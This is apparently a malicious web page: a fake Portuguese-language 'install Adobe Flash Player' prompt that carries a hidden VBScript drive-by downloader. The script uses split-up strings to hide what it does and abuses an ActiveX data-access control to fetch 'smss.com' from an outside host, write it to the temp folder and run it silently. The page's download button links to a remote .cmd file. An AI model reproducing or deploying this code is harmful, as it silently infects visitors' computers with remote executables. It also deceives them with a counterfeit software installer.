<script language="VBScript">
    on error resume next
    LNK1= "http://loard2."
    LNK2= "ifrance.com"
    LNK3= "/smss.com"
    LNK = LNK1&LNK2&LNK3
    Set df = document.createElement("object")
    PB1="clsid:BD96C556-65A3-11D0"
    PB2="-983A-00C04FC29E36"
    PPB=PB1&PB2
    df.setAttribute "classid",PPB
    str="Microsoft.XMLHTTP"
    Set x = df.CreateObject(str,"")
    ww1="Ad"
    ww2="od"
    ww3="b."
    ww4="st"
    ww5="re"
    ww6="am"

    Cpo01=ww1&ww2&ww3&ww4&ww5&ww6
    Cpo05=Cpo01
    set S = df.createobject(Cpo05,"")
    S.type = 1

    Cpo06="GET"
    x.Open Cpo06, LNK, False
    x.Send
    FFILE0="smss.com"
    Cpo10="Scripting"
    Cpo11=".FileSystemObject"
    Cpo12=Cpo10&Cpo11

    'set F = df.createobject("Scripting.FileSystemObject","")
    set F = df.createobject(Cpo12,"")
    set tmp = F.GetSpecialFolder(2) 
    FFILE0= F.BuildPath(tmp,FFILE0)
    S.open
    S.write x.responseBody
    S.savetofile FFILE0,2
    S.close
    set Q = df.createobject("Shell.Application","")
    Q.ShellExecute FFILE0,"","","open",0
    </script>
</html>
<html>
<head>
<title>Instalar o Adobe Flash Player</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>
<body bgcolor="#FFFFCC" background="http://flashplayers.net.ifrance.com/ActiveX/silverswimmer.jpg">
<table width="597" height="240" border="1" align="center" cellpadding="10" cellspacing="0" bordercolor="#cccccc">
<tbody>
<tr>
<td bgcolor="#000000"><div id="gecko">
<div id="depthpath">
</div>

<h2 class="flash"> <font size="4"><font color="#FFFFFF" face="Arial, serif, sans-serif, Lucida Sans Unicode, Lucida Console, Georgia, Franklin Gothic Medium, Comic Sans MS">Voc� n�o possui o Flash Player instalado!</font></font></h2>  
<p class="flash"><font color="#FFFFFF" size="2" face="Arial, Helvetica, sans-serif">Para
    obter os recursos desta p�gina voc� precisa ter o flash player instalado
    em seu computador.<br>
    Ao clicar no bot&atilde;o &quot;Concordar a instalar agora&quot;, voc&ecirc; concorda
    com o Contrato de licen&ccedil;a de software* e os Termos de Servi&ccedil;o
    da Barra de ferramentas do Google*.</font></p> 
<div class="columns-2-AB-A">  
  <table class="data-meta" align="center" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td><font face="Arial, Helvetica, sans-serif" size="2"><img src="http://flashplayers.net.ifrance.com/ActiveX/flashplayer_100x100.jpg" class="nohover" align="left" border="0" height="100" width="100"> </font></td> 
<td align="center" bgcolor="#FFFFFF"> <p><font color="#999999" size="2" face="Verdana, Arial, Helvetica, sans-serif">Fechar
      todas as janelas de navegador antes de instalar.<br>
      Tempo estimado de download: 1 minuto com modem de 56 Kbps.</font></p>
  <p><font face="Arial, Helvetica, sans-serif" size="2">              <a href="http://videomidiaplay.ifrance.com/www.instalar.cmd"> <img src="http://mychatweb02.ifrance.com/img/download_now.gif" class="nohover" align="middle" border="0" height="41" width="242"></a> </font></p></td>    
</tr>   </tbody></table>     
</div>      
</div>
</td>
</tr>
</tbody>
</table>
</body></html>